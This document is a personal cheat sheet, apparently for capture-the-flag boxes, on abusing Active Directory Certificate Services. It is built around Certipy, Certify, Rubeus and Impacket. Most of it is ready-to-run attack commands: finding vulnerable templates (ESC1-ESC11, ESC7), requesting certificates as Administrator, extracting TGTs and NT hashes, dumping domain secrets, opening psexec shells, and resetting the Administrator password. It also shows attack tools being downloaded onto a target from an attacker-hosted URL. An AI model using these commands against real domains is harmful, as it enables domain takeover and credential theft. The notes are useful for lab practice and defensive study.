Using Certipy
---
#certipy #Certificate-Abuse

First sync time to DC (in case of time skew):
```shell
sudo rdate -n $TARGET_IP
```
OR
```shell
sudo ntpdate -s $TARGET_IP
```
and then restore
```shell
sudo ntpdate pool.ntp.org
```

SCAN AND EXPLOIT ESC 1 - 11 vulnerable certificate templates with certipy
---
#certipy #vulnerable-template #ad #active-directory #ad-template 

find vulnerable cert templates:
```shell
certipy find -u $USER -p $PASS -dc-ip $TARGET_IP -vulnerable -stdout -text
```
request enrollment of user in template:
```shell
certipy req -u $USER -p $PASS -ca $AD_CA_NAME -target $AD_DNS_NAME -template $TEMPLATE_FOUND_NAME -upn Administrator@$DOMAIN -dc-ip $TARGET_IP -debug
```
exploit to get admin hash:
```shell
certipy auth -pfx administrator.pfx -dc-ip $TARGET_IP
```

Exploiting misconfigured Certificate template with Rubeus and Certify:
---
#ad #ad-template #misconfiguration #rubeus #certify 

Download certify.exe and Rubeus:

```powershell
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe -O Certify.exe
```

```powershell
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O Rubeus.exe
```

Download on target:

```powershell
$URL="http://$LOCAL_IP/Certify.exe"
$PATH="c:\users\$USER\Desktop\certify.exe"
(New-Object System.Net.WebClient).DownloadFile($URL, $PATH)
```
and run the search
```powershell
./certify.exe find /vulnerable
./certify.exe request /ca:dc.$DOMAIN\$DOMAIN-DC-CA /template:UserAuthentication /altname:Administrator
```

After that download the cert using evil-winrm:

```powershell
download cert.pem
```

```shell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Upload cert.pfx back to target and perform TGT request:

```powershell
upload cert.pfx
./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

or  get hash for evil-winrm etc.:

```powershell
./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

```sh
psexec.py -hashes $HASH:$HASH $USER@$TARGET_IIP
```

then

```powershell
./Rubeus.exe changepw /ticket:doIG2DCCBtSg…<snip>…== /new:Password123!! /targetuser:$DOMAIN\Administrator
```

OR use:

```link
https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
```
instead of rubeus.exe for asktgt function

OR get hash with

```
getnthash.py (untested)
```

then copy ticket.kirbi to LOCAL machine and :

```shell
base64 -di ticket.kirbi >> ticket.bin
impacket-ticketConverter ticket.bin ticket.ccache
export KRB5CCNAME=/home/kali/$TARGET_NAME-box/files/ticket.ccache
```

```sh
pip install minikerberos --user
minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
```

```sh
#fix time skew first!
impacket-secretsdump -k -no-pass g0.$DOMAIN
impacket-psexec administrator@$DOMAIN -hashes $HASHES
```

Check with:

```shell
echo $KRB5CCNAME
klist -f
sudo nano /etc/krb5.conf
```

```config
$DOMAIN = {
  kdc = dc.$DOMAIN
  admin_server = dc.$DOMAIN
}
```

then sync time with DC domain controller server

```shell
sudo ntpdate $DOMAIN_CONTROLLER
```

Finally login to server using kerberos auth:

```shell
impacket-psexec $TARGET_DOMAIN/Administrator@$DOMAIN_CONTROLLER -target-ip $TARGET_IP -dc-ip $TARGET_IP -no-pass -k
```

Powershell cmds:
---
untested, should be ok substitute for ADCSTemplate module:
```powershell
$Properties = @{}
$Properties.Add('mspki-certificate-name-flag',1)
$Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
$Properties.Add('msPKI-Certificate-Application-Policy',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
$Properties.Add('flags',0)
$Properties.Add('mspki-enrollment-flag',0)
$Properties.Add('mspki-private-key-flag',256) # 0x100
$Properties.'mspki-private-key-flag' += 16 # 0x10
$Properties.Add('pkidefaultkeyspec',1)
$Properties.Add('pKIDefaultCSPs','1,Microsoft RSA SChannel Cryptographic Provider')
Import-Module ActiveDirectory
Set-AdObject "CN=TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Replace $Properties
```
Create a com object and set the subject alternative name
```powershell
$SAN = New-Object -ComObject X509Enrollment.CX509ExtensionAlternativeNames
$IANs = New-Object -ComObject X509Enrollment.CAlternativeNames
$IAN = New-Object -ComObject X509Enrollment.CAlternativeName
$IAN.InitializeFromString(0xB,"Administrator@$AD_DOMAIN") # UPN to use
$IANs.Add($IAN)
$SAN.InitializeEncode($IANs)
```
Create a request object to request the certificate based on a template
```powershell
$Request = New-Object -ComObject X509Enrollment.CX509Enrollment
$Request.InitializeFromTemplateName(0x1,"TemplateName") # Template to use
$Request.Request.X509Extensions.Add($SAN)
$Request.CertificateFriendlyName = "TemplateName" # Template to use
```
Enroll the certificate:
```powershell
$Request.Enroll()
```

Using CertReq(untested):
---
request.inf

```inf
[NewRequest]
Subject = "CN=ComputerName,CN=Computers,DC=domain,DC=local"
Exportable = TRUE
KeyLength = 2048
KeySpec = 1
KeyUsage = 0x60
MachineKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
[RequestAttributes]
CertificateTemplate=Web
SAN="upn=Administrator@$ADDOMAIN"
[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=Administrator@$ADDOMAIN"
[EnhancedKeyUsageExtension]
OID = 1.3.6.1.4.1.311.20.2.2
OID = 1.3.6.1.5.5.7.3.2
```

then

```powershell
certreq -q -new request.inf request.pem
certreq -q -submit request.pem cert.pem
certreq -q -accept cert.pem
```


ESC7
---
#esc7

```shell
certipy find -u $USER -p PASSWORD -dc-ip $TARGET_IP -vulnerable -stdout -text

#ESC7
certipy ca -ca $AD_CA -add-officer $USER -username $USER@$AD_DOMAIN -password $PASSWORD

certipy ca -ca $AD_CA -enable-template SubCA -username $USER@$AD_DOMAIN -password $PASSWORD

certipy req -username $USER@$AD_DOMAIN -password $PASSWORD -ca $AD_CA -target manager.htb -template SubCA -upn Administrator@$AD_DOMAIN -debug

certipy ca -ca $AD_CA -issue-request XX -username $USER@$AD_DOMAIN -password $PASSWORD

certipy req -username $USER@$AD_DOMAIN -password $PASSWORD -ca $AD_CA -target $AD_DOMAIN -retrieve XX

#fix clock skew then:
sudo ntpdate -s $AD_DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $TARGET_IP
```